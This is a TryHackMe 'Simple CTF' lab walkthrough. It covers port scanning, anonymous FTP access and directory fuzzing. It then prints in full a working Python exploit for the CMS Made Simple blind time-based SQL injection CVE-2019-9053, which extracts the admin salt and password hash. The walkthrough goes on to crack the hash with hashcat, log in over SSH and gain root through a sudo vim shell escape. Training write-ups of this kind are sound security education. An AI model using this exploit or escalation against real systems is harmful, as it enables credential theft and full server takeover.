---
title: 'TryHackMe - Simple CTF'
author: r2cook
categories: [TryHackMe]
tags: [ ftp, CMS Made Simple, SQL injection, Bliend Time Based SQLI, hashcat, PrivEsc, GTFOBins, vim]
render_with_liquid: false
media_subpath: /images/thm/Simple-CTF/
image:
  path: room_card.png
---

> In this walkthrough, we compromise the TryHackMe **Simple CTF** machine by chaining together **service enumeration, web application analysis, credential recovery, and Linux privilege escalation**, ultimately progressing from initial foothold to full root compromise while capturing both flags.

## Initial Setup

Add the target to your hosts file:

```plaintext
10.128.164.18 simple.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt simple.thm
```
{: .nolineno }

### Command Breakdown

- `-p-` → scan all ports (1–65535)
    
- `-sV` → detect service versions
    
- `-sC` → run default NSE scripts
    
- `-Pn` → skip host discovery
    
- `--min-rate 1000` → faster scan (≥1000 packets/sec)
    
- `-oN` → save output to file
    
- `simple.thm` → target
    

---

### Results (FULL — unchanged)

```sql
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-31 02:25 EET  
Nmap scan report for simple.thm (10.128.164.18)  
Host is up (0.056s latency).  
Not shown: 65532 filtered tcp ports (no-response)  
PORT     STATE SERVICE VERSION  
21/tcp   open  ftp     vsftpd 3.0.3  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:192.168.145.29  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 2  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_Can't get directory listing: TIMEOUT  
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))  
|_http-title: Apache2 Ubuntu Default Page: It works  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
| http-robots.txt: 2 disallowed entries    
|_/ /openemr-5_0_1_3    
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)  
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)  
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 139.86 seconds
```

### Key Findings

- FTP → anonymous login allowed
    
- HTTP → web server + robots.txt
    
- SSH → running on port **2222 (non-standard)**
    

---

## FTP Enumeration

![](Image_1.png){: width="800" height="400" .shadow }

```shell
ftp simple.thm
```
{: .nolineno }

### Explanation

- Connects to FTP server
    
- Login used:
    
    - user: `anonymous`
        
    - pass: anything
        

---

### FTP Session (UNCHANGED)

```shell
ftp simple.thm
...
```
{: .nolineno }

### 🔍 Important Commands

- `ls -la` → list files (including hidden)
    
- `passive off` → fix timeout issue (switch mode)
    
- `cd pub` → change directory
    
- `get ForMitch.txt` → download file
    
- `bye` → exit
    

---

### File Content

```shell
cat ForMitch.txt
```
{: .nolineno }

```shell
Dammit man... you'te the worst dev i've seen...
```
{: .nolineno }

### Insight

- Password reuse
    
- Weak password → easy cracking
    

---

## web portal enum

![](Image_2.png){: width="800" height="400" .shadow }

---

### robots.txt

```txt
Disallow: /openemr-5_0_1_3
```

👉 Hidden path discovered but not accessible.

---

## Directory Fuzzing

```shell
ffuf -u http://simple.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php,.txt,.zip,.old,.log -mc 200,204,301,302,307,401,403 -c | tee ffuf_result.txt
```
{: .nolineno }

### Command Breakdown

- `-u` → target URL with FUZZ keyword
    
- `-w` → wordlist
    
- `-e` → extensions to append
    
- `-mc` → match specific HTTP codes
    
- `-c` → colored output
    
- `tee` → save output
    

---

### Output (UNCHANGED)

```shell
...
```
{: .nolineno }

👉 Found:

```
/simple
```

---

![](Image_4.png){: width="800" height="400" .shadow }

---

## CMS Discovery

![](Image_5.png){: width="800" height="400" .shadow }

- CMS Made Simple
    
- Version: 2.2.8
    

### Insight

This version is vulnerable to:

- **CVE-2019-9053**
    
- Blind time-based SQL injection
    

---

## Exploit (FULL SCRIPT — UNCHANGED)

*Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9*

```python
#!/usr/bin/env python3  
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9  
# CVE: CVE-2019-9053  
  
import requests  
from termcolor import colored, cprint  
import time  
import optparse  
import hashlib  
import sys  
  
parser = optparse.OptionParser()  
parser.add_option(  
   '-u', '--url',  
   action="store",  
   dest="url",  
   help="Base target uri (ex. http://10.10.10.100/cms)"  
)  
parser.add_option(  
   '-w', '--wordlist',  
   action="store",  
   dest="wordlist",  
   help="Wordlist for cracking admin password"  
)  
parser.add_option(  
   '-c', '--crack',  
   action="store_true",  
   dest="cracking",  
   help="Crack password with wordlist",  
   default=False  
)  
  
options, args = parser.parse_args()  
  
if not options.url:  
   print("[+] Specify a target URL")  
   print("[+] Example: exploit.py -u http://target-uri")  
   print("[+] Example with cracking: exploit.py -u http://target-uri --crack -w /path-wordlist")  
   print("[+] Adjust TIME based on network latency (time-based SQLi)")  
   sys.exit(1)  
  
url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'  
session = requests.Session()  
  
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'  
  
flag = True  
password = ""  
TIME = 1  
db_name = ""  
output = ""  
email = ""  
salt = ""  
wordlist = options.wordlist if options.wordlist else ""  
  
  
def crack_password():  
   global password, output, wordlist, salt  
  
   with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:  
       for line in f:  
           line = line.strip()  
           beautify_print_try(line)  
  
           hash_try = hashlib.md5((str(salt) + line).encode()).hexdigest()  
  
           if hash_try == password:  
               output += f"\n[+] Password cracked: {line}"  
               break  
  
  
def beautify_print_try(value):  
   global output  
   print("\033c", end="")  
   cprint(output, 'green', attrs=['bold'])  
   cprint(f'[*] Try: {value}', 'red', attrs=['bold'])  
  
  
def beautify_print():  
   global output  
   print("\033c", end="")  
   cprint(output, 'green', attrs=['bold'])  
  
  
def time_based_extract(field, table, condition):  
   global output  
   result = ""  
   hex_result = ""  
   extracting = True  
  
   while extracting:  
       extracting = False  
  
       for char in dictionary:  
           temp = result + char  
           hex_temp = hex_result + hex(ord(char))[2:]  
  
           beautify_print_try(temp)  
  
           payload = (  
               f"a,b,1,5))+and+(select+sleep({TIME})+from+{table}"  
               f"+where+{field}+like+0x{hex_temp}25+and+{condition})--+"  
           )  
  
           url = url_vuln + "&m1_idlist=" + payload  
  
           start_time = time.time()  
           session.get(url, timeout=TIME + 5)  
           elapsed = time.time() - start_time  
  
           if elapsed >= TIME:  
               extracting = True  
               result = temp  
               hex_result = hex_temp  
               break  
  
   return result  
  
  
def dump_salt():  
   global salt, output  
  
   result = ""  
   hex_result = ""  
   extracting = True  
  
   while extracting:  
       extracting = False  
  
       for char in dictionary:  
           temp = result + char  
           hex_temp = hex_result + hex(ord(char))[2:]  
  
           beautify_print_try(temp)  
  
           payload = (  
               f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_siteprefs"  
               f"+where+sitepref_value+like+0x{hex_temp}25"  
               f"+and+sitepref_name+like+0x736974656d61736b)--+"  
           )  
  
           url = url_vuln + "&m1_idlist=" + payload  
  
           start_time = time.time()  
           session.get(url, timeout=TIME + 5)  
           elapsed = time.time() - start_time  
  
           if elapsed >= TIME:  
               extracting = True  
               result = temp  
               hex_result = hex_temp  
               break  
  
   salt = result  
   output += f"\n[+] Salt found: {salt}"  
  
  
def dump_username():  
   global db_name, output  
   db_name = time_based_extract("username", "cms_users", "user_id+like+0x31")  
   output += f"\n[+] Username found: {db_name}"  
  
  
def dump_email():  
   global email, output  
   email = time_based_extract("email", "cms_users", "user_id+like+0x31")  
   output += f"\n[+] Email found: {email}"  
  
  
def dump_password():  
   global password, output  
   password = time_based_extract("password", "cms_users", "user_id+like+0x31")  
   output += f"\n[+] Password hash found: {password}"  
  
  
dump_salt()  
dump_username()  
dump_email()  
dump_password()  
  
if options.cracking:  
   print(colored("[*] Attempting password crack...", "yellow"))  
   crack_password()  
  
beautify_print()
```

### What the Exploit Does

- Uses **time-based SQLi**:
    
    - Injects payload with `SLEEP()`
        
    - If response is delayed → condition is TRUE
        
- Extracts:
    
    - salt
        
    - username
        
    - email
        
    - password hash
        

---

## Running Exploit

```shell
python3 exploit.py -u http://simple.thm/simple
```
{: .nolineno }

### Arguments

- `-u` → target URL
    

---

### Output

```shell
[+] Salt found: 1dac0d92e9fa6bb2  
[+] Username found: mitch  
[+] Email found: admin@admin.com  
[+] Password hash found: 0c01f4468bd75d7a84c7eb73846e8d96
```
{: .nolineno }

---

![](Image_6.png){: width="800" height="400" .shadow }

---

## Cracking Password

```shell
echo '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' > hash.txt
```
{: .nolineno }

👉 Format: `hash:salt`

---

```shell
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
```
{: .nolineno }

### Explanation

- `hashcat` → password cracking tool
    
- `-m 20` → md5(salt+password)
    
- `hash.txt` → input hash
    
- `rockyou.txt` → wordlist
    

---

### Result (UNCHANGED)

```shell
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```
{: .nolineno }

---

## Credentials

```
mitch:secret
```

---

## Foothold

```shell
ssh mitch@simple.thm -p 2222
```
{: .nolineno }

### Explanation

- `ssh` → remote login
    
- `-p 2222` → custom port
    

---

```shell
$ id
```
{: .nolineno }

- Shows current user identity
    

```shell
$ cat user.txt
```
{: .nolineno }

- Reads user flag
    

---

## Privilege Escalation (PrivEsc)

```shell
sudo -l
```
{: .nolineno }

### Explanation

- Lists allowed sudo commands
    

---

### Result

```
(root) NOPASSWD: /usr/bin/vim
```

👉 Can run vim as root without password

---

## Exploit Vim

```shell
sudo vim -c ':set shell=/bin/sh' -c ':shell'
```
{: .nolineno }

### Breakdown

- `sudo vim` → run as root
    
- `-c` → execute command inside vim
    
- `:set shell=/bin/sh` → define shell
    
- `:shell` → spawn shell
    

---

## Root

```shell
# id
uid=0(root)
```
{: .nolineno }

```shell
# cat /root/root.txt
```
{: .nolineno }

---